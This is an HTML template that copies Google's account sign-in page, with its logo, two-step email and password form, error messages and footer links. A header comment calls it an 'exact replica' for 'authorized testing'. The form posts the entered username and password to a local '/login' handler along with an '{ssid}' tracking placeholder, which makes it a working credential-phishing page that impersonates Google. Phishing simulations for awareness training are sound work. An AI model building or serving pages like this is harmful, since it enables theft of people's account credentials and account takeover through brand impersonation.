<!-- Google — exact replica (2024) — FOR AUTHORIZED TESTING ONLY -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in – Google Accounts</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:"Google Sans",Roboto,Arial,sans-serif;background:#f8f9fa;color:#202124;min-height:100vh;display:flex;flex-direction:column}
  .container{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
  .card{width:100%;max-width:450px;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
  .logo{display:flex;justify-content:center;margin-bottom:12px}
  .logo svg{width:75px;height:24px}
  h1{font-size:24px;font-weight:400;line-height:32px;text-align:center;margin:0}
  .subtitle{font-size:16px;font-weight:400;line-height:24px;text-align:center;color:#202124;margin:8px 0 32px}
  .field{position:relative;margin-bottom:8px}
  .field input{width:100%;height:56px;padding:13px 15px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;background:#fff;transition:border-color .15s}
  .field input:focus{border-color:#1a73e8;border-width:2px;padding-top:12px}
  .field label{position:absolute;left:13px;top:50%;transform:translateY(-50%);background:#fff;padding:0 4px;color:#5f6368;font-size:16px;pointer-events:none;transition:.15s}
  .field input:focus + label,.field input:not(:placeholder-shown) + label{top:0;font-size:12px;color:#1a73e8}
  .field input.has-error{border-color:#d93025}
  .field input.has-error + label{color:#d93025}
  .error{color:#d93025;font-size:12px;margin:4px 0 0 2px;display:none}
  .error.show{display:block}
  .link{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
  .link:hover{text-decoration:underline}
  .hint{margin:8px 0 32px}
  .actions{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
  .btn-text{background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;padding:0 8px;height:36px;border-radius:4px;cursor:pointer}
  .btn-text:hover{background:#f6fafe}
  .btn{height:36px;padding:0 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;letter-spacing:.25px;cursor:pointer}
  .btn:hover{background:#1b66c9;box-shadow:0 1px 2px rgba(60,64,67,.3)}
  .btn:disabled{opacity:.6;pointer-events:none}
  .footer{padding:0 24px 24px;display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#5f6368;max-width:450px;margin:0 auto;width:100%}
  .footer select{border:none;background:none;color:#5f6368;font-size:12px}
  .footer a{color:#5f6368;text-decoration:none;margin-left:16px}
  .muted{font-size:14px;color:#5f6368;margin-top:40px}
  .muted a{color:#1a73e8;text-decoration:none;font-weight:500}
  .step{display:none}
  .step.active{display:block}
  .user-pill{display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:16px;padding:4px 8px;font-size:14px;margin:0 auto 24px;justify-content:center}
  .user-pill svg{width:20px;height:20px}
  @media(max-width:480px){.card{border:none;padding:24px 24px 16px;max-width:100%;background:transparent}.container{padding:0;align-items:flex-start;background:#fff}.footer{padding:16px}}
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <div class="logo" aria-label="Google">
      <svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L12.6 5.2c-.66-.62-1.54-1.08-2.81-1.08-2.3 0-4.2 1.9-4.2 4.28s1.9 4.28 4.2 4.28c2.17 0 3.42-1.13 3.96-1.99.22-.35.35-.78.4-1.5H9.24z"/><path fill="#EA4335" d="M25 6.19c-3.21 0-5.6 2.38-5.6 5.42s2.39 5.42 5.6 5.42c3.21 0 5.6-2.38 5.6-5.42s-2.39-5.42-5.6-5.42zm0 8.96c-1.8 0-3.14-1.5-3.14-3.54s1.34-3.54 3.14-3.54 3.14 1.5 3.14 3.54-1.34 3.54-3.14 3.54z"/><path fill="#FBBC05" d="M37.49 6.19c-3.21 0-5.6 2.38-5.6 5.42s2.39 5.42 5.6 5.42c3.21 0 5.6-2.38 5.6-5.42s-2.39-5.42-5.6-5.42zm0 8.96c-1.8 0-3.14-1.5-3.14-3.54s1.34-3.54 3.14-3.54 3.14 1.5 3.14 3.54-1.34 3.54-3.14 3.54z"/><path fill="#4285F4" d="M48.58 13.18c0-.31-.02-.62-.06-.94H43v2.46h3.23c-.14 1.25-.94 2.04-2.11 2.04-1.28 0-2.54-1.03-2.54-3.13s1.26-3.13 2.54-3.13c.65 0 1.3.25 1.76.68l1.46-1.4c-.86-.8-1.98-1.27-3.22-1.27-2.63 0-4.98 2.13-4.98 5.12s2.35 5.12 4.98 5.12c2.86 0 4.78-2 4.78-4.85 0-.32-.02-.6-.06-.7z"/><path fill="#34A853" d="M58.94 6.19c-1.28 0-2.39.4-3.22 1.09l1.46 1.42c.48-.45 1.07-.68 1.76-.68 1.28 0 2.11.79 2.11 2.04H56.5c-.04.32-.06.63-.06.94 0 2.85 1.92 4.85 4.78 4.85 2.63 0 4.98-2.13 4.98-5.12s-2.35-5.12-4.98-5.12c-1.24 0-2.36.47-3.22 1.27l1.46 1.4c.46-.43 1.11-.68 1.76-.68 1.17 0 1.97.79 2.11 2.04h-3.23v-2.46h5.52c.04.32.06.63.06.94 0 .1 0 .38-.02.7z"/><path fill="#EA4335" d="M68.5 6.19v9.81h2.47V6.19h-2.47z"/></g></svg>
    </div>
    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>

    <form id="login-form" method="POST" action="/login" novalidate>
      <input type="hidden" name="ssid" value="{ssid}">
      <!-- Step 1: Email -->
      <div id="step1" class="step active">
        <div class="field">
          <input id="email" name="username" type="email" placeholder=" " autocomplete="username" spellcheck="false" required autofocus>
          <label for="email">Email or phone</label>
        </div>
        <div class="error" id="err-email">Enter a valid email</div>
        <div class="hint"><a class="link" href="#">Forgot email?</a></div>
        <p class="muted">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
        <div class="actions">
          <button type="button" class="btn-text">Create account</button>
          <button type="button" class="btn" id="btn-next">Next</button>
        </div>
      </div>
      <!-- Step 2: Password -->
      <div id="step2" class="step">
        <div class="user-pill" id="user-pill"><svg viewBox="0 0 24 24" fill="#5f6368"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg><span id="pill-email"></span></div>
        <div class="field">
          <input id="password" name="password" type="password" placeholder=" " autocomplete="current-password" required>
          <label for="password">Enter your password</label>
        </div>
        <div style="display:flex;align-items:center;gap:8px;margin:8px 0 16px">
          <input type="checkbox" id="show" style="width:16px;height:16px" onchange="document.getElementById('password').type=this.checked?'text':'password'">
          <label for="show" style="font-size:14px;cursor:pointer">Show password</label>
        </div>
        <div class="error" id="err-pass">Enter a password</div>
        <div class="actions">
          <button type="button" class="btn-text" id="btn-back">Back</button>
          <button type="submit" class="btn" id="btn-submit">Next</button>
        </div>
      </div>
    </form>
  </div>
</div>
<div class="footer">
  <div><select><option>English (United States)</option></select></div>
  <div><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
</div>
<script>
  const emailEl = document.getElementById('email');
  const passEl = document.getElementById('password');
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');
  const errEmail = document.getElementById('err-email');
  const errPass = document.getElementById('err-pass');
  function isValidEmail(v){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
  document.getElementById('btn-next').addEventListener('click', ()=>{
    const v = emailEl.value.trim();
    errEmail.classList.remove('show'); emailEl.classList.remove('has-error');
    if(!isValidEmail(v)){ errEmail.textContent='Enter a valid email'; errEmail.classList.add('show'); emailEl.classList.add('has-error'); return; }
    document.getElementById('pill-email').textContent = v;
    step1.classList.remove('active'); step2.classList.add('active'); passEl.focus();
  });
  document.getElementById('btn-back').addEventListener('click', ()=>{ step2.classList.remove('active'); step1.classList.add('active'); emailEl.focus(); });
  document.getElementById('login-form').addEventListener('submit', (e)=>{
    const v = passEl.value;
    errPass.classList.remove('show'); passEl.classList.remove('has-error');
    if(!v){ errPass.classList.add('show'); passEl.classList.add('has-error'); e.preventDefault(); return; }
    const btn = document.getElementById('btn-submit'); btn.textContent='Verifying…'; btn.disabled=true;
  });
  emailEl.addEventListener('input', ()=>{ errEmail.classList.remove('show'); emailEl.classList.remove('has-error'); });
  passEl.addEventListener('input', ()=>{ errPass.classList.remove('show'); passEl.classList.remove('has-error'); });
</script>
</body>
</html>
